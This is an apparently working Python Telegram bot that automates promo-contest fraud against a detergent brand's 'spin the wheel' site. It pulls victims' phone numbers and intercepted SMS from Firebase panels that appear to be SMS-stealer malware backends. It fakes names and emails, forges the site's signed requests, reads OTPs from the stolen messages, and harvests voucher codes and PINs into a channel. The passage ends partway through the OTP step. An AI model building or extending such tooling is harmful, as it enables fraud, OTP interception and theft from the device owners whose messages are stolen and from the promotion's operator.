#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ujala Happy Pack — Telegram Bot (Full async / aiohttp)
- requests + ThreadPoolExecutor REMOVED
- aiohttp + asyncio.gather everywhere
- threading.Thread se asyncio.create_task pe migrate
- builtins._bot_event_loop REMOVED — sab ek hi event loop pe
"""

import asyncio
from collections import Counter
import os, json, re, base64, random, hmac, hashlib, time, urllib.parse
import logging, sqlite3
from datetime import datetime, timedelta
from functools import wraps

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters,
)
from telegram.constants import ParseMode

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================
#  ⚙️  CONFIG — EDIT THESE
# ============================================================
BOT_TOKEN               = os.getenv("BOT_TOKEN", "PASTE_YOUR_BOT_TOKEN_HERE")
BOT_USERNAME            = ""   # startup pe auto-set hoga
REQUIRED_CHANNELS       = ["@thetricksmaster"]
ADMIN_IDS = [123456789]

WINNER_CHANNEL_ID       = -1004483528498
FIREBASE_LOG_CHANNEL_ID = -1003758000001

DB_FILE         = "ujala_bot_v3.db"
PACK_IMAGE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ujala_pack.jpg")

BASE_URL = "https://www.ujalahappiestonam.com"
API_BASE = f"{BASE_URL}/api"
BARCODE  = "8902102126232"

MAX_FIREBASE_LINKS   = 1   # 1 link per session — each user isolated
COOLDOWN_MINUTES     = 3
EXPIRE_WARN_MINUTES  = 10
REFER_VALIDITY_HOURS = 1   # hours awarded per refer reward (flat, no tiers)

REWARD_SMS_MAX_WAIT      = 1800
REWARD_SMS_POLL_INTERVAL = 15

OTP_POLL_ATTEMPTS  = 5
OTP_POLL_INTERVAL  = 3
OTP_SENDER         = "BGCITY|BIGCITY"
REWARD_CODE_SENDER = "BGCITY"
MAX_RETRIES        = 3
RETRY_DELAY        = 3

OTP_GET_RETRIES    = 3   # how many times to re-request OTP if send fails
OTP_VERIFY_RETRIES = 3   # how many times to re-poll + re-verify if OTP wrong/expired
SPIN_RETRIES       = 5   # how many times to retry spin before giving up
SPIN_RETRY_DELAY   = 3   # seconds between spin retries
BATCH_SIZE         = 5          # concurrent phones per firebase link
MAX_GLOBAL_SEM     = 50        # global cap — 1 slot per user for ~200 users

FIRST_NAMES = ["Rahul","Amit","Sanjay","Vivek","Arjun","Priya","Anjali","Neha","Pooja","Sakshi","Deepak","Rajesh","Manoj","Suresh","Anil"]
SURNAMES    = ["Nair","Menon","Pillai","Kurian","Varma","Sharma","Kumar","Singh","Patel","Reddy"]
CITIES      = ["kochi", "kerala"]

HEADERS_BASE = {
    "accept":             "application/json",
    "origin":             BASE_URL,
    "referer":            f"{BASE_URL}/",
    "user-agent":         "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua":          '"Not A;Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    "sec-ch-ua-mobile":   "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-fetch-dest":     "empty",
    "sec-fetch-mode":     "cors",
    "sec-fetch-site":     "same-origin",
}

# Global semaphore — event loop start hone ke baad banao
_global_sem: asyncio.Semaphore = None  # type: ignore

# ============================================================
#  🗄️  DATABASE  (sync sqlite — fast enough, no blocking concern)
# ============================================================
def get_db():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=30)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA busy_timeout=10000")
    return conn

def init_db():
    conn = get_db()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id         INTEGER PRIMARY KEY,
            username        TEXT,
            full_name       TEXT,
            joined_at       TEXT,
            valid_until     TEXT,
            refer_count     INTEGER DEFAULT 0,
            referred_by     INTEGER DEFAULT NULL,
            refer_credited  INTEGER DEFAULT 0,
            is_banned       INTEGER DEFAULT 0,
            last_session    TEXT,
            total_success   INTEGER DEFAULT 0,
            total_winners   INTEGER DEFAULT 0
        );
        -- Migration: add refer_credited if not exists
        CREATE TABLE IF NOT EXISTS _migrations (id INTEGER PRIMARY KEY);
        CREATE TABLE IF NOT EXISTS sessions (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id       INTEGER,
            started_at    TEXT,
            finished_at   TEXT,
            links_count   INTEGER DEFAULT 0,
            success_count INTEGER DEFAULT 0,
            winner_count  INTEGER DEFAULT 0,
            status        TEXT DEFAULT 'running'
        );
        CREATE TABLE IF NOT EXISTS winners (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id       INTEGER,
            phone         TEXT,
            reward_code   TEXT,
            pin           TEXT,
            sms_body      TEXT,
            found_at      TEXT
        );
        CREATE TABLE IF NOT EXISTS firebase_links (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id    INTEGER,
            link       TEXT,
            added_at   TEXT
        );
    """)
    conn.commit()
    # Migration for existing DBs — add refer_credited column if missing
    try:
        conn.execute("ALTER TABLE users ADD COLUMN refer_credited INTEGER DEFAULT 0")
        conn.commit()
        logger.info("Migration: added refer_credited column")
    except Exception:
        pass  # Column already exists
    conn.close()

# ── DB helpers ─────────────────────────────────────────────────
def db_get_user(user_id):
    conn = get_db()
    row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    return row

def db_upsert_user(user_id, username, full_name):
    conn = get_db()
    conn.execute("""
        INSERT INTO users (user_id, username, full_name, joined_at)
        VALUES (?,?,?,?)
        ON CONFLICT(user_id) DO UPDATE SET username=excluded.username, full_name=excluded.full_name
    """, (user_id, username or "", full_name or "", datetime.now().isoformat()))
    conn.commit()
    conn.close()

def db_set_referred_by(user_id, referrer_id):
    conn = get_db()
    conn.execute("UPDATE users SET referred_by=? WHERE user_id=? AND referred_by IS NULL",
                 (referrer_id, user_id))
    conn.commit()
    conn.close()

def get_refer_hours(current_refer_count):
    """Return flat hours to award per refer reward (no tiers)."""
    return REFER_VALIDITY_HOURS

def db_add_validity(user_id, hours):
    """Add validity hours to user — stacks on top of existing validity."""
    conn = get_db()
    row = conn.execute("SELECT valid_until FROM users WHERE user_id=?", (user_id,)).fetchone()
    now = datetime.now()
    if row and row["valid_until"]:
        try:
            base = max(datetime.fromisoformat(row["valid_until"]), now)
        except Exception:
            base = now
    else:
        base = now
    new_valid = (base + timedelta(hours=hours)).isoformat()
    conn.execute("UPDATE users SET valid_until=? WHERE user_id=?", (new_valid, user_id))
    conn.commit()
    conn.close()
    return new_valid

def db_add_refer_count(referrer_id):
    conn = get_db()
    conn.execute("UPDATE users SET refer_count = refer_count + 1 WHERE user_id=?", (referrer_id,))
    conn.commit()
    conn.close()

def _db_mark_refer_credited(user_id):
    """Mark that this user's referrer has already been credited — prevent double credit."""
    conn = get_db()
    try:
        conn.execute("UPDATE users SET refer_credited=1 WHERE user_id=?", (user_id,))
        conn.commit()
    except Exception:
        pass
    conn.close()

def db_is_valid(user_id):
    row = db_get_user(user_id)
    if not row or not row["valid_until"]:
        return False, None
    try:
        valid_until = datetime.fromisoformat(row["valid_until"])
        return datetime.now() < valid_until, valid_until
    except Exception:
        return False, None

def db_set_last_session(user_id):
    conn = get_db()
    conn.execute("UPDATE users SET last_session=? WHERE user_id=?",
                 (datetime.now().isoformat(), user_id))
    conn.commit()
    conn.close()

def db_get_last_session(user_id):
    row = db_get_user(user_id)
    return row["last_session"] if row else None

def db_add_winner(user_id, phone, reward_code, pin, sms_body):
    conn = get_db()
    conn.execute("""
        INSERT INTO winners (user_id, phone, reward_code, pin, sms_body, found_at)
        VALUES (?,?,?,?,?,?)
    """, (user_id, phone, reward_code, pin or "", sms_body, datetime.now().isoformat()))
    conn.execute("UPDATE users SET total_winners = total_winners + 1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def db_add_success(user_id):
    conn = get_db()
    conn.execute("UPDATE users SET total_success = total_success + 1 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()

def db_log_firebase_link(user_id, link):
    conn = get_db()
    conn.execute("INSERT INTO firebase_links (user_id, link, added_at) VALUES (?,?,?)",
                 (user_id, link, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def db_new_session(user_id, links_count):
    conn = get_db()
    cur = conn.execute("""
        INSERT INTO sessions (user_id, started_at, links_count, status)
        VALUES (?,?,?,?)
    """, (user_id, datetime.now().isoformat(), links_count, "running"))
    sid = cur.lastrowid
    conn.commit()
    conn.close()
    return sid

def db_finish_session(session_id, success_count, winner_count):
    conn = get_db()
    conn.execute("""
        UPDATE sessions SET finished_at=?, success_count=?, winner_count=?, status='done'
        WHERE id=?
    """, (datetime.now().isoformat(), success_count, winner_count, session_id))
    conn.commit()
    conn.close()

def db_get_history(user_id):
    conn = get_db()
    rows = conn.execute("SELECT * FROM sessions WHERE user_id=? ORDER BY started_at DESC LIMIT 10",
                        (user_id,)).fetchall()
    conn.close()
    return rows

def db_get_winners(user_id):
    conn = get_db()
    rows = conn.execute("SELECT * FROM winners WHERE user_id=? ORDER BY found_at DESC LIMIT 20",
                        (user_id,)).fetchall()
    conn.close()
    return rows

def db_get_leaderboard():
    conn = get_db()
    rows = conn.execute("""
        SELECT user_id, full_name, username, refer_count
        FROM users ORDER BY refer_count DESC LIMIT 10
    """).fetchall()
    conn.close()
    return rows

def db_total_users():
    conn = get_db()
    row = conn.execute("SELECT COUNT(*) as cnt FROM users").fetchone()
    conn.close()
    return row["cnt"]

def db_ban_user(user_id, ban=True):
    conn = get_db()
    conn.execute("UPDATE users SET is_banned=? WHERE user_id=?", (1 if ban else 0, user_id))
    conn.commit()
    conn.close()

def db_is_banned(user_id):
    row = db_get_user(user_id)
    return bool(row and row["is_banned"] == 1)

# ============================================================
#  🔐 DECORATORS / GUARDS
# ============================================================
def admin_only(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.effective_message.reply_text("❌ Admin only command.")
            return
        return await func(update, context)
    return wrapper


async def check_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    uid = update.effective_user.id
    if db_is_banned(uid):
        await update.effective_message.reply_text("🚫 You are banned from using this bot.")
        return False
    if uid in ADMIN_IDS:
        return True
    # Channel join check only — no validity block
    not_joined = []
    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(channel, uid)
            if member.status in ("left", "kicked"):
                not_joined.append(channel)
        except Exception as e:
            logger.warning(f"Channel check failed for {channel}: {e}")
            not_joined.append(channel)
    if not_joined:
        buttons = [[InlineKeyboardButton(f"📢 Join {ch}", url=f"https://t.me/{ch.lstrip('@')}")]
                   for ch in not_joined]
        buttons.append([InlineKeyboardButton("✅ Maine Join Kar Liya — Verify Karo", callback_data="verify_channels")])
        await update.effective_message.reply_text(
            "⚠️ Pehle ye saare channels join karo:\n\n" + "\n".join(not_joined) +
            "\n\nJoin karne ke baad neeche <b>Verify</b> button dabao.",
            reply_markup=InlineKeyboardMarkup(buttons),
            parse_mode=ParseMode.HTML
        )
        return False
    return True


# ============================================================
#  📢 TELEGRAM HELPERS
# ============================================================
async def notify_winner_channel(context, user_id, username, phone, reward_code, pin, sms_body):
    row = db_get_user(user_id)
    full_name = row["full_name"] if row else ""
    pin_line  = f"\n🔑 PIN: <code>{pin}</code>" if pin else ""
    msg = (
        f"🏆 <b>NEW WINNER!</b>\n\n"
        f"👤 User: {full_name} (@{username or 'N/A'})\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🎁 Reward Code: <code>{reward_code}</code>{pin_line}\n"
        f"📩 SMS: {sms_body[:200]}\n"
        f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    try:
        await context.bot.send_message(WINNER_CHANNEL_ID, msg, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Winner channel notify failed: {e}")

async def notify_firebase_log(context, user_id, username, links):
    row = db_get_user(user_id)
    full_name  = row["full_name"] if row else ""
    links_text = "\n".join([f"  • {l}" for l in links])
    msg = (
        f"🔗 <b>Firebase Links Submitted</b>\n\n"
        f"👤 User: {full_name} (@{username or 'N/A'}) [ID: {user_id}]\n"
        f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"Links:\n{links_text}"
    )
    try:
        await context.bot.send_message(FIREBASE_LOG_CHANNEL_ID, msg, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Firebase log channel notify failed: {e}")

# ============================================================
#  ⏰ EXPIRE WARN JOB
# ============================================================
async def check_expiry_warnings(context: ContextTypes.DEFAULT_TYPE):
    conn = get_db()
    rows = conn.execute(
        "SELECT user_id, valid_until FROM users WHERE valid_until IS NOT NULL AND is_banned=0"
    ).fetchall()
    conn.close()
    now     = datetime.now()
    warn_at = timedelta(minutes=EXPIRE_WARN_MINUTES)
    for row in rows:
        try:
            valid_until = datetime.fromisoformat(row["valid_until"])
            time_left   = valid_until - now
            if timedelta(0) < time_left <= warn_at:
                try:
                    await context.bot.send_message(
                        row["user_id"],
                        f"⚠️ <b>Validity Expiring Soon!</b>\n\n"
                        f"Your bot access expires in <b>{int(time_left.total_seconds() // 60)} minutes</b>.\n\n"
                        f"Refer more users to extend: /refer",
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass
        except Exception:
            pass

# ============================================================
#  🔧 UTILS
# ============================================================
def rnd_name():
    return f"{random.choice(FIRST_NAMES)} {random.choice(SURNAMES)}"

def rnd_email(name):
    parts   = name.lower().split()
    digits  = str(random.randint(10, 999))          # 2-3 digits — realistic email
    domains = ["gmail.com", "gmail.com", "gmail.com", "yahoo.com", "outlook.com"]
    sep     = random.choice(["", ".", "_"])
    local   = sep.join(parts) + digits
    local   = re.sub(r"[^a-z0-9._]", "", local)
    return f"{local}@{random.choice(domains)}"

def sign_payload(payload_dict, data_key):
    c        = str(int(time.time() * 1000))
    json_str = json.dumps(payload_dict, separators=(",", ":"))
    a        = base64.b64encode(json_str.encode()).decode()
    s        = base64.b64encode(c.encode()).decode()
    hmac_key = data_key[4:18]
    h_hex    = hmac.new(hmac_key.encode(), (s + "." + a).encode(), hashlib.sha256).hexdigest()
    l        = base64.b64encode(h_hex.encode()).decode()
    chars    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    h_pos    = random.randint(1, 6)
    p_len    = random.randint(0, 6) * 2
    k        = "".join(random.choices(chars, k=p_len))
    g        = str(p_len) + str(h_pos) + l[:h_pos] + k + l[h_pos:]
    return s + "." + a + "." + g, int(c)

def sign_payload_form(user_key, data_key, extra_fields=None):
    payload = dict(extra_fields or {})
    payload["userKey"] = user_key
    payload["t"]       = int(time.time() * 1000)
    data_value, ts     = sign_payload(payload, data_key)
    data_str = "userKey=" + str(user_key) + "&data=" + urllib.parse.quote_plus(data_value)
    return data_str, ts

def decode_resp(raw):
    try:
        outer = json.loads(raw)
        if "resp" in outer:
            return json.loads(base64.b64decode(outer["resp"]).decode())
        return outer
    except Exception as e:
        logger.error(f"decode_resp error: {e}")
        return {}

def parse_firebase_link(link):
    if link.startswith("https://") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        return link if link.endswith("/") else link + "/"
    parsed = urllib.parse.urlparse(link)
    qs     = urllib.parse.parse_qs(parsed.query)
    if "s" not in qs:
        return None
    s_param = qs["s"][0] + "=" * ((4 - len(qs["s"][0]) % 4) % 4)
    try:
        decoded = base64.b64decode(s_param).decode("utf-8").split("|")[0].strip()
        return decoded if decoded.endswith("/") else decoded + "/"
    except Exception:
        return None

def extract_phone_from_messages(msgs):
    """Weighted Counter scoring — same logic as working script."""
    patterns = [
        (re.compile(r'\b(?:\+91|91|0)?([6-9]\d{9})\b'), 10),
        (re.compile(r'\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b', re.IGNORECASE), 15),
        (re.compile(r'[^0-9]([6-9]\d{9})[^0-9]'), 5),
    ]
    counts = Counter()
    for msg in msgs.values():
        if not isinstance(msg, dict):
            continue
        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
        for pattern, score in patterns:
            for number in pattern.findall(text):
                counts[number] += score
    if not counts:
        return None
    return counts.most_common(1)[0][0]

def extract_otp_from_messages(msgs, trigger_ms):
    # reversed(list(...)) preserves Firebase insertion order reversed (newest-first).
    # sorted(..., reverse=True) sorts LEXICOGRAPHICALLY — wrong for push IDs like -NxAbCd.
    for mid in reversed(list(msgs.keys())):
        msg = msgs[mid]
        if not isinstance(msg, dict):
            continue
        # Timestamp filter — only for numeric IDs; skip for Firebase push IDs
        try:
            if int(mid) < (trigger_ms - 30_000):
                continue
        except ValueError:
            pass  # Firebase push ID — no numeric filter, keep processing
        sender = msg.get("sender", "")
        if not any(s.lower() in sender.lower() for s in OTP_SENDER.split("|")):
            continue
        body = msg.get("body") or msg.get("message") or msg.get("text") or ""
        # Strict 4 or 6 digits only — avoids false matches on prices, dates, etc.
        m = re.search(r'(?<!\d)(\d{4}|\d{6})(?!\d)', body)
        if m:
            return m.group(1)
    return None

def extract_reward_code_sms(msgs, trigger_ms):
    """
    Scan Firebase messages for reward SMS from BGCITY sender.
    Returns (code, pin, body) or (None, None, None).

    Key ordering: Firebase keys are either timestamps (ms) or push-IDs ("-OAbc...").
    We want NEWEST first — so we sort numeric keys descending, push-IDs stay reversed.
    trigger_ms = OTP send time. Reward SMS arrives 10-15 min after spin — so any
    message after (trigger_ms - 30s) is a candidate.
    """
    # Sort keys: numeric timestamps descending (newest first), push-IDs as-is reversed
    def _sort_key(k):
        try:
            return -int(k)   # numeric: negate for descending
        except ValueError:
            return 0         # push-IDs: treat equally (already newest-first in Firebase)

    sorted_keys = sorted(msgs.keys(), key=_sort_key)

    for mid in sorted_keys:
        msg = msgs[mid]
        if not isinstance(msg, dict):
            continue
        # Skip messages older than trigger_ms - 30s
        try:
            if int(mid) < (trigger_ms - 30_000):
                continue
        except ValueError:
            pass  # push-ID key — can't compare, keep processing

        sender = msg.get("sender", "")
        if REWARD_CODE_SENDER.lower() not in sender.lower():
            continue
        body = msg.get("body") or msg.get("message") or msg.get("text") or ""
        if not body:
            continue

        # Pattern 1: Ujala promo  "...promo is AW44D3H6YRV4..."
        m = re.search(r'promo\s+is\s+([A-Z0-9]{6,20})', body, re.IGNORECASE)
        if m:
            return m.group(1).upper(), None, body.strip()

        # Pattern 2: Flipkart voucher (with or without hyphens, numeric or alphanumeric)
        # Real example: "...Gift Voucher is 6000170523169848 PIN: 122575..."
        if re.search(r'flipkart', body, re.IGNORECASE):
            # Primary: keyword + code (handles hyphens + pure numeric)
            fk = re.search(
                r'(?:gift\s*(?:voucher|card|gc)|voucher|gc|code)\s*(?:is|:|-|–)?\s*'
                r'([A-Z0-9][A-Z0-9\-]{5,30}[A-Z0-9]|\d{10,20})',
                body, re.IGNORECASE,
            )
            pin = None
            pm = re.search(r'\bPIN\s*:?\s*(\d{4,8})\b', body, re.IGNORECASE)
            if pm:
                pin = pm.group(1)
            if fk:
                return fk.group(1).upper(), pin, body.strip()
            # Fallback: longest hyphenated token
            hyph = re.findall(r'\b([A-Z0-9]{2,}-[A-Z0-9]{2,}(?:-[A-Z0-9]{2,})*)\b', body, re.IGNORECASE)
            if hyph:
                return max(hyph, key=len).upper(), pin, body.strip()
            # Fallback: pure numeric 10-20 digits (voucher number)
            nums = re.findall(r'\b(\d{10,20})\b', body)
            if nums:
                return max(nums, key=len), pin, body.strip()

        # Pattern 3: generic fallback — long token after "is"
        m2 = re.search(r'\bis\s+([A-Z0-9][A-Z0-9\-]{6,28}[A-Z0-9])\b', body, re.IGNORECASE)
        if m2:
            return m2.group(1).upper(), None, body.strip()

    return None, None, None

def is_50_rupee_reward(v):
    return bool(re.search(r'(?<!\d)50(?!\d)', str(v).lower()))

def is_flipkart_reward(v):
    return bool(re.search(r'flipkart', str(v).lower()))

def _extract_reward(resp):
    for key in ("reward", "rewardType", "prize", "voucher"):
        v = resp.get(key)
        if v is not None:
            return v
    data = resp.get("data")
    if isinstance(data, dict):
        for key in ("reward", "rewardType", "prize", "voucher"):
            v = data.get(key)
            if v is not None:
                return v
    return "Unknown"

# ============================================================
#  🌐 ASYNC API CALLS (aiohttp)
# ============================================================
async def async_decode_resp(resp: aiohttp.ClientResponse) -> dict:
    try:
        raw = await resp.text()
        return decode_resp(raw)
    except Exception:
        return {}

async def async_with_retry(coro_fn, label, retries=MAX_RETRIES):
    last = {}
    for attempt in range(1, retries + 1):
        try:
            result = await coro_fn()
            if result.get("statusCode") in (200, 201):
                return result
            last = result
        except Exception as e:
            last = {"statusCode": 0, "message": str(e)}
        if attempt < retries:
            await asyncio.sleep(RETRY_DELAY * (2 ** (attempt - 1)))
    return last

async def api_register(sess: aiohttp.ClientSession) -> dict:
    try:
        async with sess.post(
            f"{API_BASE}/users",
            headers={**HEADERS_BASE, "Content-Type": "application/json"},
            data=BARCODE, timeout=aiohttp.ClientTimeout(total=15)
        ) as r:
            return await async_decode_resp(r) if r.status == 200 else {"statusCode": r.status}
    except Exception as e:
        return {"statusCode": 0, "message": str(e)}

async def api_get_otp(sess: aiohttp.ClientSession, user_key, data_key,
                      mobile, name, city, image_bytes, email="") -> dict:
    ts  = int(time.time() * 1000)
    url = f"{API_BASE}/users/getOTP/{user_key}?t={ts}"
    headers = dict(HEADERS_BASE)
    headers["Authorization"] = f"Bearer {data_key}"
    payload_fields = {
        "name": name, "mobile": mobile, "email": email,
        "city": city.lower(), "code": BARCODE,
        "agreed1": "Yes", "agreed2": "Yes",
        "userKey": user_key, "t": ts,
    }
    data_value, _ = sign_payload(payload_fields, data_key)
    form = aiohttp.FormData()
    form.add_field("userKey", str(user_key))
    form.add_field("pack", image_bytes, filename="ujala_pack.jpg", content_type="image/jpeg")
    form.add_field("data", data_value)
    try:
        async with sess.post(url, headers=headers, data=form,
                             timeout=aiohttp.ClientTimeout(total=30)) as r:
            return await async_decode_resp(r) if r.status == 200 else {"statusCode": r.status}
    except Exception as e:
        return {"statusCode": 0, "message": str(e)}

async def api_verify_otp(sess: aiohttp.ClientSession, user_key, data_key, otp) -> dict:
    data_str, ts = sign_payload_form(user_key, data_key, {"otp": otp})
    url = f"{API_BASE}/users/verifyOTP/{user_key}?t={ts}"
    headers = {**HEADERS_BASE, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    try:
        async with sess.post(url, headers=headers, data=data_str,
                             timeout=aiohttp.ClientTimeout(total=15)) as r:
            return await async_decode_resp(r) if r.status == 200 else {"statusCode": r.status}
    except Exception as e:
        return {"statusCode": 0, "message": str(e)}

async def api_spin(sess: aiohttp.ClientSession, user_key, access_token, data_key) -> dict:
    data_str, ts = sign_payload_form(user_key, data_key, {})
    url = f"{API_BASE}/users/speenTheWheel/{user_key}?t={ts}"
    headers = {**HEADERS_BASE,
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "Authorization": f"Bearer {access_token}"}
    try:
        async with sess.post(url, headers=headers, data=data_str,
                             timeout=aiohttp.ClientTimeout(total=20)) as r:
            return await async_decode_resp(r) if r.status == 200 else {"statusCode": r.status}
    except Exception as e:
        return {"statusCode": 0, "message": str(e)}

async def api_claim(sess: aiohttp.ClientSession, user_key, access_token, data_key) -> dict:
    for path in [f"users/claimNow/{user_key}", f"users/submitDetails/{user_key}", f"users/claim/{user_key}", f"users/getReward/{user_key}"]:
        data_str, ts = sign_payload_form(user_key, data_key, {})
        url     = f"{API_BASE}/{path}?t={ts}"
        headers = {**HEADERS_BASE,
                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "Authorization": f"Bearer {access_token}"}
        try:
            async with sess.post(url, headers=headers, data=data_str,
                                 timeout=aiohttp.ClientTimeout(total=15)) as r:
                result = await async_decode_resp(r)
                if result.get("statusCode") == 200:
                    return result
        except Exception:
            pass
    return {}

# ============================================================
#  🔥 FIREBASE FETCH (async)
# ============================================================
async def fetch_devices_and_phones(firebase_url: str, http: aiohttp.ClientSession) -> list:
    """
    1. clients.json fetch karo — online devices dhundho
    2. messages.json ek baar full fetch karo (fast + consistent)
    3. Har online device ka phone nikalo messages se
    """
    # Step 1: clients.json — online devices
    try:
        async with http.get(f"{firebase_url}clients.json",
                            timeout=aiohttp.ClientTimeout(total=30)) as r:
            clients_data = await r.json(content_type=None) or {}
    except Exception as e:
        logger.error(f"clients.json fetch failed ({firebase_url}): {e}")
        return []

    if not isinstance(clients_data, dict):
        return []

    def _is_online(c_data):
        if not isinstance(c_data, dict):
            return False
        status = c_data.get("status")
        # Boolean True
        if status is True:
            return True
        # Integer 1
        if status == 1:
            return True
        # String variants used by different Firebase panels
        if isinstance(status, str) and status.lower() in ("true", "online", "active", "connected", "1"):
            return True
        # Some panels store status in a separate 'online' or 'connected' key
        if c_data.get("online") in (True, 1) or c_data.get("connected") in (True, 1):
            return True
        if isinstance(c_data.get("online"), str) and c_data["online"].lower() in ("true", "1", "online"):
            return True
        return False

    online_ids = [c_id for c_id, c_data in clients_data.items() if _is_online(c_data)]
    total      = len(clients_data)
    logger.info(f"Panel {firebase_url.split('//')[1][:40]}: {len(online_ids)} online / {total} total")

    if not online_ids:
        return []

    # Step 2: messages.json full fetch — ek hi call mein sab milta hai
    try:
        async with http.get(f"{firebase_url}messages.json",
                            timeout=aiohttp.ClientTimeout(total=60)) as r:
            all_messages = await r.json(content_type=None) or {}
    except Exception as e:
        logger.error(f"messages.json fetch failed ({firebase_url}): {e}")
        all_messages = {}

    if not isinstance(all_messages, dict):
        all_messages = {}

    # Step 3: phone extract karo sirf online devices ke liye
    seen   = set()
    phones = []

    PHONE_KEYS = ("phone", "mobile", "phoneNumber", "number", "Phone", "Mobile")

    for c_id in online_ids:
        phone = None

        # Pehle clients.json mein direct phone field check karo
        c_data = clients_data.get(c_id, {})
        for key in PHONE_KEYS:
            val = str(c_data.get(key, "")).strip()
            m = re.search(r'(?:\+91|91|0)?([6-9]\d{9})', val)
            if m:
                phone = m.group(1)
                break

        # Agar nahi mila toh messages se nikalo
        if not phone:
            device_msgs = all_messages.get(c_id, {})
            if isinstance(device_msgs, dict) and device_msgs:
                phone = extract_phone_from_messages(device_msgs)

        if phone and phone not in seen:
            seen.add(phone)
            phones.append({
                "client_id"      : c_id,
                "phone"          : phone,
                "messages_cache" : all_messages.get(c_id, {}),
                "firebase_url"   : firebase_url,
            })

    logger.info(f"Panel {firebase_url.split('//')[1][:40]}: {len(phones)} phone(s) found")
    return phones

async def poll_for_otp(firebase_url, client_id, trigger_ms, http: aiohttp.ClientSession,
                       initial_messages=None) -> str | None:
    for attempt in range(OTP_POLL_ATTEMPTS):
        try:
            if attempt == 0 and isinstance(initial_messages, dict):
                msgs = initial_messages
            else:
                async with http.get(f"{firebase_url}messages/{client_id}.json",
                                    timeout=aiohttp.ClientTimeout(total=15)) as r:
                    msgs = await r.json(content_type=None)
            if isinstance(msgs, dict):
                otp = extract_otp_from_messages(msgs, trigger_ms)
                if otp:
                    return otp
        except Exception as e:
            logger.error(f"OTP poll error: {e}")
        if attempt < OTP_POLL_ATTEMPTS - 1:
            await asyncio.sleep(OTP_POLL_INTERVAL)
    return None

# ============================================================
#  🏭 PROCESS ONE PHONE (fully async)
# ============================================================
async def process_number(phone, client_id, firebase_url, image_bytes,
                         http: aiohttp.ClientSession, messages_cache=None) -> dict:
    async with _global_sem:
        name  = rnd_name()
        city  = random.choice(CITIES)
        email = rnd_email(name)

        # Already used check — only scan messages from the OTP/reward sender (BGCITY)
        # Scanning ALL messages causes false positives (promo SMSes mention unrelated numbers)
        if isinstance(messages_cache, dict):
            pat = re.compile(r'\b(?:\+91|91|0)?([6-9]\d{9})\b')
            used = set()
            for md in messages_cache.values():
                if not isinstance(md, dict):
                    continue
                sender = md.get("sender", "")
                # Only flag as used if the OTP/reward sender (BGCITY) already messaged this number
                if not any(s.lower() in sender.lower() for s in OTP_SENDER.split("|")):
                    continue
                body = md.get("body") or md.get("message") or md.get("text") or ""
                for m in pat.finditer(body):
                    used.add(m.group(1))
            if phone in used:
                return {"phone": phone, "status": "already_used", "reward": ""}

        # Each phone gets its own HTTP session — matches working script behaviour
        phone_conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=phone_conn, headers=HEADERS_BASE) as phone_sess:

            # Step 1: Register
            reg = await async_with_retry(lambda: api_register(phone_sess), f"register-{phone}")
            if reg.get("statusCode") not in (200, 201):
                return {"phone": phone, "status": "failed", "reward": ""}

            # Direct key extraction — working script uses reg["userKey"] not reg["data"]["userKey"]
            user_key = reg.get("userKey") or reg.get("data", {}).get("userKey")
            data_key = str(reg.get("dataKey") or reg.get("data", {}).get("dataKey") or "")
            if not user_key or not data_key:
                return {"phone": phone, "status": "failed", "reward": ""}

            # Step 2: Send OTP — retry OTP_GET_RETRIES times
            # trigger_ms reset on each attempt so Firebase poll window stays accurate
            otp_resp = None
            trigger_ms = int(time.time() * 1000)
            for _otp_get_attempt in range(1, OTP_GET_RETRIES + 1):
                trigger_ms = int(time.time() * 1000)
                resp = await api_get_otp(phone_sess, user_key, data_key, phone, name, city, image_bytes)
                if resp.get("statusCode") in (200, 201):
                    otp_resp = resp
                    break
                err_msg = resp.get("message", "") or ""
                # Server explicitly says number is already registered
                if any(w in err_msg.lower() for w in ("already", "exist", "used", "registered")):
                    return {"phone": phone, "status": "already_used", "reward": ""}
